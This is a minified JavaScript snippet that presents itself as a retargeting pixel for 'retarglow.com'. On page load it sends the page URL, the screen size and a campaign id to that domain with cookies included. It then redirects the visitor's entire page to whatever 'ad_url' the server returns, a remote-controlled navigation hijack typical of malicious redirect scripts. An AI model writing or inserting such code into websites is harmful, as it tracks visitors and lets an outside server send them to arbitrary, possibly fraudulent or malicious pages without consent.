(()=>{(function(){const t=typeof globalThis!="undefined"?globalThis:typeof window!="undefined"?window:void 0;if(!t)return;const e=t.__RETARGLOW_PIXEL__||{},o=t.document;function l(){if(e.endpoint)try{return new URL(e.endpoint,t.location?t.location.href:void 0).origin}catch(n){}try{if(t.location&&t.location.origin)return t.location.origin}catch(n){}return"https://retarglow.com"}const u=l().replace(/\/$/,"")+"/b";function c(){if(typeof e.url=="string")return e.url;try{if(o&&o.location&&typeof o.location.href=="string")return o.location.href;if(t.location&&typeof t.location.href=="string")return t.location.href}catch(n){}return null}function d(){if(!t.screen)return null;const n=Number(t.screen.width)||0,r=Number(t.screen.height)||0;return!n||!r?null:n+"x"+r}const s={cid:typeof e.cid=="string"?e.cid:null,u:c(),sr:d()};function f(n){if(typeof n!="string"||!n)return null;try{if(t.location&&typeof t.location.href=="string")return new URL(n,t.location.href).href}catch(r){}try{return new URL(n).href}catch(r){}return n}function h(n){if(!(typeof n!="string"||!n)){try{if(t.location&&typeof t.location.assign=="function"){t.location.assign(n);return}}catch(r){}try{t.location&&(t.location.href=n)}catch(r){}}}function y(n){if(!n)return;let r=null;if(typeof n=="object"&&n!==null&&typeof n.ad_url=="string"&&n.ad_url&&(r=n.ad_url),!r)return;const i=f(r),a=f(c());i&&a&&i===a||h(i||r)}function g(){try{const n=JSON.stringify(s);return t.fetch(u,{method:"POST",headers:{"Content-Type":"application/json"},credentials:"include",body:n})}catch(n){return Promise.reject(n)}}g().then(n=>!n||!n.ok?null:n.json().catch(()=>null)).then(y).catch(()=>{})})();})();